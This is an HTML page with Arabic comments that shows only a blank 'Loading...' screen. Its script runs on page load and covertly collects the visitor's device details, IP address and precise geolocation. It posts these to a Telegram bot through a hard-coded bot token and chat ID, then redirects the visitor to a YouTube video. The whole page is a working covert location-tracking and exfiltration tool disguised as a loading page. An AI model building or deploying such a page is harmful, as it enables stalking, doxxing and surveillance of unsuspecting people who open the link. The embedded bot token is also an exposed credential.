<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
        }

        .hidden-content {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            opacity: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="hidden-content" id="hiddenStatus">جاري المعالجة...</div>

    <script>
        // =============================================================================
        // إعدادات النظام - تأكد من صحة هذه البيانات
        // =============================================================================
        
        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
        const CHAT_ID = '170383339';
        const MAX_WAIT_TIME = 3000; // زيادة الوقت قليلاً
        
        // =============================================================================
        
        let dataCollected = false;
        let sendingData = false;
        
        function log(message) {
            console.log(`🔧 ${new Date().toLocaleTimeString()} - ${message}`);
        }
        
        // جمع المعلومات الأساسية
        function collectBasicData() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            const basicData = {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', {
                    timeZone: 'Asia/Baghdad',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                }),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                language: navigator.language,
                platform: navigator.platform,
                screenRes: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'مجهول',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'مجهول'
            };
            
            log('البيانات الأساسية: ' + JSON.stringify(basicData, null, 2));
            return basicData;
        }
        
        // الحصول على IP - محدث ومُحسن
        async function getIP() {
            log('🌍 بدء الحصول على IP...');
            
            const services = [
                {
                    url: 'https://api.ipify.org?format=json',
                    parser: (data) => data.ip
                },
                {
                    url: 'https://httpbin.org/ip',
                    parser: (data) => data.origin
                },
                {
                    url: 'https://api.myip.com',
                    parser: (data) => data.ip
                },
                {
                    url: 'https://ipapi.co/json/',
                    parser: (data) => data.ip
                }
            ];
            
            for (let service of services) {
                try {
                    log(`محاولة ${service.url}`);
                    
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 2000);
                    
                    const response = await fetch(service.url, {
                        method: 'GET',
                        signal: controller.signal,
                        headers: {
                            'Accept': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (compatible; DataCollector/1.0)'
                        },
                        mode: 'cors'
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = service.parser(data);
                        
                        if (ip && ip !== 'undefined') {
                            log(`✅ IP محصل: ${ip} من ${service.url}`);
                            return ip;
                        }
                    }
                    
                } catch (error) {
                    log(`❌ فشل ${service.url}: ${error.message}`);
                    continue;
                }
            }
            
            log('❌ فشل في الحصول على IP من جميع الخدمات');
            return 'غير متاح';
        }
        
        // الحصول على الموقع - محدث
        function getLocation() {
            return new Promise((resolve) => {
                log('📍 بدء الحصول على الموقع...');
                
                if (!navigator.geolocation) {
                    log('❌ المتصفح لا يدعم تحديد الموقع');
                    resolve(null);
                    return;
                }
                
                let resolved = false;
                let attempts = 0;
                
                function handleSuccess(position) {
                    if (!resolved) {
                        resolved = true;
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        };
                        log(`✅ موقع محصل: ${location.latitude}, ${location.longitude} (دقة: ${location.accuracy}م)`);
                        resolve(location);
                    }
                }
                
                function handleError(error) {
                    attempts++;
                    log(`❌ خطأ الموقع ${attempts}: ${error.code} - ${error.message}`);
                    
                    if (attempts >= 2 && !resolved) {
                        resolved = true;
                        resolve(null);
                    }
                }
                
                // محاولة أولى - دقة عالية
                navigator.geolocation.getCurrentPosition(
                    handleSuccess,
                    handleError,
                    {
                        enableHighAccuracy: true,
                        timeout: 2000,
                        maximumAge: 30000
                    }
                );
                
                // محاولة ثانية بعد ثانية واحدة
                setTimeout(() => {
                    if (!resolved) {
                        log('🔄 محاولة ثانية للموقع...');
                        navigator.geolocation.getCurrentPosition(
                            handleSuccess,
                            handleError,
                            {
                                enableHighAccuracy: false,
                                timeout: 1500,
                                maximumAge: 60000
                            }
                        );
                    }
                }, 1000);
                
                // انتهاء المهلة النهائية
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        log('⏰ انتهت مهلة الحصول على الموقع');
                        resolve(null);
                    }
                }, 2500);
            });
        }
        
        // إنشاء رابط Google Maps
        function createMapsLink(lat, lng) {
            return `https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},272m/data=!3m1!1e3`;
        }
        
        // إرسال البيانات - محدث ومُحسن
        async function sendData(data) {
            if (sendingData) {
                log('⚠️ إرسال البيانات قيد التقدم بالفعل');
                return false;
            }
            
            sendingData = true;
            log('📤 بدء إرسال البيانات...');
            
            let locationText = 'غير متاح';
            let mapsLink = '';
            
            if (data.location) {
                const { latitude, longitude, accuracy } = data.location;
                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
                mapsLink = createMapsLink(latitude, longitude);
            }
            
            const message = `🎯 زائر جديد (نظام محدث):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${data.device.localTime}
🌐 الرابط: ${data.device.url}
🔗 المرجع: ${data.device.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 الجهاز: ${data.device.deviceType} | ${data.device.browser}
📱 هاتف محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
🌍 عنوان IP: ${data.ip}
📍 الموقع: ${locationText}
${mapsLink ? `🗺️ رابط الخريطة: ${mapsLink}` : ''}
🗣️ اللغة: ${data.device.language}
🌍 المنطقة الزمنية: ${data.device.timezone}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 الشاشة: ${data.device.screenRes}
🪟 النافذة: ${data.device.windowSize}
🖥️ النظام: ${data.device.platform}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 User Agent:
${data.device.userAgent}`;
            
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                disable_web_page_preview: false,
                parse_mode: 'HTML'
            };
            
            log('📝 الرسالة المُرسلة: ' + message.substring(0, 100) + '...');
            
            // محاولات متعددة للإرسال
            for (let attempt = 1; attempt <= 5; attempt++) {
                try {
                    log(`📤 محاولة الإرسال ${attempt}/5`);
                    
                    const response = await fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(payload),
                        mode: 'cors'
                    });
                    
                    log(`📡 استجابة الخادم: ${response.status} ${response.statusText}`);
                    
                    if (response.ok) {
                        const result = await response.json();
                        log('📋 نتيجة Telegram: ' + JSON.stringify(result));
                        
                        if (result.ok) {
                            log('✅ تم إرسال الرسالة الأساسية بنجاح!');
                            dataCollected = true;
                            
                            // إرسال رابط الموقع منفصل
                            if (mapsLink) {
                                try {
                                    const mapResponse = await fetch(telegramUrl, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CHAT_ID,
                                            text: `🗺️ رابط الموقع المباشر:\n${mapsLink}`,
                                            disable_web_page_preview: false
                                        })
                                    });
                                    
                                    if (mapResponse.ok) {
                                        log('✅ تم إرسال رابط الخريطة!');
                                    }
                                } catch (e) {
                                    log('⚠️ فشل إرسال رابط الخريطة: ' + e.message);
                                }
                            }
                            
                            sendingData = false;
                            return true;
                        } else {
                            log(`❌ خطأ Telegram: ${result.description}`);
                        }
                    } else {
                        const errorText = await response.text();
                        log(`❌ فشل HTTP: ${response.status} - ${errorText}`);
                    }
                    
                } catch (error) {
                    log(`❌ خطأ في الإرسال ${attempt}: ${error.name} - ${error.message}`);
                    
                    if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
                        log('🚫 مشكلة في الاتصال - CORS أو Network');
                    }
                }
                
                // انتظار قبل المحاولة التالية
                if (attempt < 5) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            log('❌ فشل في جميع محاولات الإرسال');
            sendingData = false;
            return false;
        }
        
        // التحويل
        function redirect() {
            log('🔄 تحويل إلى: ' + REDIRECT_URL);
            try {
                window.location.replace(REDIRECT_URL);
            } catch (error) {
                log('⚠️ فشل التحويل، محاولة بديلة...');
                window.location.href = REDIRECT_URL;
            }
        }
        
        // العملية الرئيسية
        async function main() {
            log('🚀 بدء النظام في ' + new Date().toLocaleTimeString());
            
            try {
                // جمع البيانات الأساسية
                const basicData = collectBasicData();
                log('✅ تم جمع البيانات الأساسية');
                
                // جمع IP والموقع
                log('🔄 بدء جمع IP والموقع...');
                
                const startTime = Date.now();
                const [ip, location] = await Promise.allSettled([
                    getIP(),
                    getLocation()
                ]);
                
                const endTime = Date.now();
                log(`⏱️ وقت جمع البيانات: ${endTime - startTime}ms`);
                
                const fullData = {
                    device: basicData,
                    ip: ip.status === 'fulfilled' ? ip.value : 'غير متاح',
                    location: location.status === 'fulfilled' ? location.value : null
                };
                
                log('📊 البيانات النهائية: ' + JSON.stringify({
                    ip: fullData.ip,
                    location: fullData.location,
                    device: fullData.device.deviceType
                }));
                
                // إرسال البيانات مع انتظار النتيجة
                log('📤 محاولة إرسال البيانات...');
                const sendResult = await sendData(fullData);
                
                if (sendResult) {
                    log('✅ تم إرسال البيانات بنجاح - التحويل بعد ثانيتين');
                    setTimeout(redirect, 2000);
                } else {
                    log('❌ فشل الإرسال - التحويل فوري');
                    redirect();
                }
                
            } catch (error) {
                log('❌ خطأ عام في النظام: ' + error.message);
                redirect();
            }
        }
        
        // بدء النظام
        log('🔧 تحميل النظام...');
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', main);
        } else {
            setTimeout(main, 100);
        }
        
        // حماية من التعليق
        setTimeout(() => {
            if (!window.location.href.includes('youtube.com')) {
                log('⏰ تحويل اضطراري بعد 8 ثواني');
                redirect();
            }
        }, 8000);
        
        // تحويل فوري عند تحميل النافذة
        window.addEventListener('load', () => {
            setTimeout(() => {
                if (!dataCollected && !window.location.href.includes('youtube.com')) {
                    log('⚡ تحويل سريع من window.load');
                    redirect();
                }
            }, 200);
        });
        
        log('🎯 النظام محمل ومستعد');
    </script>
</body>
</html>
